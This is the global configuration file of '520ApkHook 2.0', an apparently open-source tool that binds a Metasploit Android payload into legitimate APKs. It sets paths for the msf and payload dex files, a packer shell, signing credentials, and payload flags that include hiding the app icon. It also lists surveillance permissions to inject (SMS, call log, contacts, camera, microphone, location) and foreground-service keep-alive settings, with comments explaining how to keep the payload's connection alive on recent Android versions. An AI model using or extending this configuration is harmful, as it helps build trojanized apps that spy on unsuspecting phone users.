#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
520ApkHook 全局配置（2.0）

改动要点（相对 v1.1）：
  * 新增 PageAlign / StoreLibs / Compat 等 Android 15+/16KB 页相关配置；
  * 权限表更新：去掉 SuperSU 时代的 ACCESS_SUPERUSER，补上 Android 13+ 需要的
    POST_NOTIFICATIONS / FOREGROUND_SERVICE 等；
  * 新增 ReportFile / BackupDir，方便出问题时回滚与自动化。
"""

VERSION = '2.0.0'
CODENAME = 'Android 17 Ready'

# ---------------------------------------------------------------------------
# 归属信息（2.0 起集中维护，main.py 的 banner / --version / --about /
# report.json 全部读这里，改一处即可）
# ---------------------------------------------------------------------------
AUTHOR = 'BaoGuo'                       # 原始作者（2021 年初版 520apkhook）
AUTHOR_EMAIL = 'cleverbao@outlook.com'
MAINTAINER = 'huocai250'                # 2.0+ 维护者
MAINTAINER_EMAIL = '1332334007@qq.com'
PROJECT_URL = 'https://github.com/huocai250/apkhook520'
UPSTREAM_URL = 'https://github.com/cleverbao/520apkhook'
LICENSE_NAME = 'Apache License 2.0'
COPYRIGHT = '(c) 2021 %s; 2.0+ maintenance %s' % (AUTHOR, MAINTAINER)

OPTIONS = {
    'Version': VERSION,
    'Codename': CODENAME,
    'Author': AUTHOR,
    'Maintainer': MAINTAINER,
    'ProjectUrl': PROJECT_URL,
    'UpstreamUrl': UPSTREAM_URL,
    'License': LICENSE_NAME,

    # ------------------------------------------------------------------ 目录
    'TestDir': 'WorkDir',
    'TestDirApkFile': 'WorkDir/apkfile',
    'TestDirDexFile': 'WorkDir/dexfile',
    'TestDirUnZipApkPath': 'WorkDir/apkfile/app',
    'TestDirUnZipXmlPath': 'WorkDir/apkfile/xml',
    'TestDirAppUnSmaliPath': 'WorkDir/dexfile/app',
    'TestDirMsfUnSmaliPath': 'WorkDir/dexfile/msf',
    'TestDirPayloadSmaliPath': 'WorkDir/dexfile/payload',
    'TestDirLibTmpPath': 'WorkDir/apkfile/lib_tmp',

    # ------------------------------------------------------------------ 产物
    'ZipExtractPath': 'WorkDir/apkfile/app/',
    'ZipCompressPath': 'WorkDir/apkfile/app/',
    'ZipFinishApk': 'WorkDir/AllFinish.apk',
    'ReportFile': 'WorkDir/report.json',

    # ------------------------------------------------------------------ msf
    'MsfBaseDexFile': 'libs/MsfDexDir/classes.dex',
    'MsfBuildDexFile': 'WorkDir/dexfile/msf_build/classes.dex',
    'MsfHandler': 'WorkDir/handler.rc',

    # ------------------------------------------------------------------ java
    'JavaPath': r'',
    'JarFilePath': 'libs/jar/',

    # 自定义签名证书：改这里即可（路径支持相对/绝对）
    'Keystorefile': 'libs/520.keystore',
    'KeystorePass': '520ApkHook',
    # 没有单独设置 key 密码时使用同一密码
    'KeyPass': '520ApkHook',
    'SignV1': True,
    'SignV2': True,
    'SignV3': True,

    'AESCryptKey': "huangdh'l,.AMWK;",

    # ------------------------------------------------------------------ 壳
    'SteadyDexFile': 'libs/ShellDexDir/classes.dex',
    'SteadyLibFile': 'libs/ShellDexDir/jni_lib',
    'SteadyLauncherActivity': 'com.sakuqi.steady.SteadyApplication',

    # ------------------------------------------------------------- 打包/兼容
    # 16KB：Android 15+/16KB page size 设备要求 .so 16KB 对齐
    'PageAlign': 0x4000,
    # .so 是否以 STORED 方式写入（True 兼容 extractNativeLibs=false 的 App）
    'StoreLibs': True,
    # 自动修补 App 自带的 .so 的 16KB 对齐（best-effort）
    'FixAppLibs': True,
    # 低于此值会被 Android 14/15 拒绝安装，自动上调（None 表示不强制）
    'MinInstallableTargetSdk': 24,
    # 输出 dex 时是否允许把 payload 单独放一个 dex（更稳，避免 64K 方法数超限）
    'PayloadInSeparateDex': True,
    # payload 会话标志位（写进 TLV 配置的 TLV_TYPE_SESSION_FLAGS）
    # 1=stageless 2=debug 4=唤醒锁 8=隐藏图标，默认 4
    'PayloadFlags': 4,

    # ------------------------------------------------------------- 权限注入
    # 注入到 AndroidManifest 的权限。Android 会忽略未知/签名级权限，
    # 所以这里保留 msf 需要的能力集合即可。
    'UsesPermission': [
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.ACCESS_WIFI_STATE',
        'android.permission.CHANGE_WIFI_STATE',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.READ_PHONE_STATE',
        'android.permission.CALL_PHONE',
        'android.permission.READ_CALL_LOG',
        'android.permission.WRITE_CALL_LOG',
        'android.permission.READ_CONTACTS',
        'android.permission.WRITE_CONTACTS',
        'android.permission.READ_SMS',
        'android.permission.RECEIVE_SMS',
        'android.permission.SEND_SMS',
        'android.permission.RECORD_AUDIO',
        'android.permission.CAMERA',
        'android.permission.SET_WALLPAPER',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WAKE_LOCK',
        'android.permission.RECEIVE_BOOT_COMPLETED',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        # Android 13 (API 33) 起通知需要运行时权限，缺了会让 payload 提示不可见
        'android.permission.POST_NOTIFICATIONS',
        # Android 14 (API 34) 起前台服务必须声明类型权限才能在后台常驻
        'android.permission.FOREGROUND_SERVICE',
        'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
    ],
    # provider 注入模式（2/5/6）用：前台服务保活 + 唤醒锁。
    # 否则 App 一切到后台就会被 Android 冻结/回收，payload 的 socket 直接断。
    'KeepAlivePermission': [
        'android.permission.WAKE_LOCK',
        'android.permission.FOREGROUND_SERVICE',
        'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
        'android.permission.POST_NOTIFICATIONS',
        'android.permission.RECEIVE_BOOT_COMPLETED',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
    ],
}
